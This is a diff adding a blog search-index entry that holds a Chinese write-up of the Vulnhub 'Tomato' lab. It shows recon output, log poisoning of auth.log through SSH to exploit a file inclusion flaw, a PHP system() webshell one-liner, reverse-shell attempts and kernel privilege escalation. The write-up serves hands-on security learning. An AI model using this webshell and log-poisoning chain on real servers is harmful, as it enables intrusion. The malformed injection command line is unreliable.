@@ -1318,4 +1318,55 @@
         <tag>Vulnhub-Hard</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Tomato打靶</title>
+    <url>/2022/02/09/tomato/index/</url>
+    <content><![CDATA[<h1 id="Tomato打靶"><a href="#Tomato打靶" class="headerlink" title="Tomato打靶"></a>Tomato打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>下载地址：</p>
+<p>难度：低-&gt;高</p>
+<hr>
+<p>应用技术：</p>
+<p>目录扫描</p>
+<p>日志写入</p>
+<p>url编码<code>php</code>反弹shell</p>
+<p>内核提权</p>
+<hr>
+<p>系统介绍</p>
+<p>本机：<em>Kali Linux IP：192.168.0.107</em></p>
+<p>目标IP：<em>Ubuntu IP：192.168.0.103</em></p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用<code>arp-scan</code>进行主机发现</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.107</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.10	b4:2e:99:95:70:6a	GIGA-BYTE TECHNOLOGY CO.,LTD.</span><br><span class="line">192.168.0.10	b4:2e:99:95:70:6a	GIGA-BYTE TECHNOLOGY CO.,LTD. (DUP: 2)</span><br><span class="line">192.168.0.103	08:00:27:92:e6:da	PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ nmap -p- -sV 192.168.0.103</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-09 08:43 EST</span><br><span class="line">Nmap scan report for 192.168.0.103</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8888/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>目标打开了 <code>80</code> <code>8888</code>端口，</p>
+<h3 id="3-目录发现"><a href="#3-目录发现" class="headerlink" title="3.目录发现"></a>3.目录发现</h3><p>对80端口的<code>web</code>服务进行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ dirsearch -u http://192.168.0.103 -w /usr/share/wordlists/dirb/common.txt   </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613</span><br><span class="line"></span><br><span class="line">Output File: /home/yifang/.dirsearch/reports/192.168.0.103/_22-02-09_08-46-47.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/yifang/.dirsearch/logs/errors-22-02-09_08-46-47.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.103/</span><br><span class="line"></span><br><span class="line">[08:46:47] Starting: </span><br><span class="line">[08:46:47] 301 -  322B  - /antibot_image  -&gt;  http://192.168.0.103/antibot_image/</span><br><span class="line">[08:46:49] 200 -  652B  - /index.html</span><br><span class="line">[08:46:51] 403 -  278B  - /server-status</span><br></pre></td></tr></table></figure>
+
+<p><code>anti_image</code>下存在 <code>antibots/</code>文件夹，其中<code>info.php</code>为<code>phpinfo</code>页面，审查目标源代码可以看到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202092151287.png"></p>
+<p>这个明显是一个文件保护的漏洞！！！</p>
+<h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><p>保护目标的日志文件 <code>/var/log/auth.log</code>文件，发现目标对<code>ssh</code>以及<code>ftp</code>的错误登录进行日志记录，</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php echo system($_GET[&#x27;c&#x27;]);?&gt;&#x27;@192.168.0.102 -p 2211</span><br></pre></td></tr></table></figure>
+
+<p>即可，木马尽量写成<code>system</code>函数的，<code>eval</code>马在此处不好使，毕竟能一步到位的事情，就不要分两步走</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202092205593.png"></p>
+<p>反弹shell，使用nc先进行尝试，但是在连接之后马上断开，再更改其他方式，使用<code>php</code>进行反弹shell</p>
+<p>但是前提得<code>url编码</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202092228984.png"></p>
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>推荐一个工具 <code>linux-exploit-suggester</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install linux-exploit-suggester</span><br></pre></td></tr></table></figure>
+
+<p>安装即可 <code>/usr/share/linux-exploit-suggester</code>下有他的工具，放置到目标的系统下面，加执行权限，运行即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202092249633.png"></p>
+<p>该工具会把最有可能进行提权成功的漏洞显示出来，在使用第二个漏洞就提权成功了</p>
+<p>提权成功！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202092254093.png"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
 </search>
